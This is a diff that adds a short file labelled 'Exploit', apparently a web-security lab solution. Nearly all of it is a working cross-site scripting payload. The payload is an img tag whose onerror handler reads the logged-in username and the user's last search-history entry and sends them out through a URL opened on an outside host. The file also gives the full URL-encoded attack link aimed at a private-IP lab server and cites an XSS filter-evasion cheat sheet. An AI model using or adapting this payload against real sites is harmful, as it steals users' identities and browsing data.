@@ -1,0 +1,6 @@
+### Exploit ###
+<img src = "" onerror = "window.onload=function(){var username = document.getElementById('logged-in-user').innerText;var lastsearch = document.getElementsByClassName('history-item list-group-item')[1].innerText;window.open('http://www.google.com/search?q='+username+'_'+lastsearch);}">
+
+Ref: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+http://172.27.16.3:33414/c011a736/search?q=%3Cimg+src+%3D+%22%22+onerror+%3D+%22window.onload%3Dfunction%28%29%7Bvar+username+%3D+document.getElementById%28%27logged-in-user%27%29.innerText%3B+++++++var+lastsearch+%3D+document.getElementsByClassName%28%27history-item+list-group-item%27%29%5B1%5D.innerText%3B+++++++window.open%28%27http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3D%27%2Busername%2B%27_%27%2Blastsearch%29%3B%7D%22%3E+
